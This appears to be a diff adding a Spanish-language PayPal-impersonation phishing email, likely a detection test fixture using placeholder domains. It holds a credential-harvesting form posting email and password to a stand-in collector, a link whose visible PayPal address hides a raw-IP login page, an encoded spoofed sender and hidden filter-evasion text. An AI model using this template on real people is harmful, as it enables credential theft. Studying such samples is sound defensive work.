@@ -1,0 +1,25 @@
+Received: from smtp.cloud-mailer.test (smtp.cloud-mailer.test [203.0.113.140]) by mx.example.com; Wed, 21 Oct 2026 12:30:05 +0200
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=cloud-mailer.test; dkim=none; dmarc=none
+From: =?UTF-8?B?UNCweXBhbCDCtyBTZWd1cmlkYWQ=?= <seguridad@cloud-mailer.test>
+To: pablo@example.com
+Subject: =?UTF-8?Q?Actividad_inusual_en_tu_cuenta_=E2=80=8B?=
+Date: Wed, 21 Oct 2026 12:30:00 +0200
+Message-ID: <a1b2c3@cloud-mailer.test>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="adv-01"
+
+--adv-01
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<div style="display:none;font-size:0">Gracias por confiar en nosotros. Este mensaje contiene información sobre tu suscripción, tus pedidos recientes, nuestras condiciones de uso y la política de privacidad actualizada para este año.</div>
+<p>Hemos detectado un inicio de sesión desde un dispositivo desconocido.</p>
+<p>Para proteger tu cuenta, confirma tu contraseña en el siguiente formulario:</p>
+<form action="https://cuenta-verificacion.test/collect" method="post">
+  <input name="email" placeholder="Email">
+  <input name="password" type="password" placeholder="Contraseña">
+  <button>Confirmar</button>
+</form>
+<p>O accede desde <a href="https://eur02.safelinks.protection.outlook.com/?url=http%3A%2F%2F203.0.113.140%2Fpaypal%2Flogin&amp;data=05">https://www.paypal.com/signin</a></p>
+</body></html>
+--adv-01--
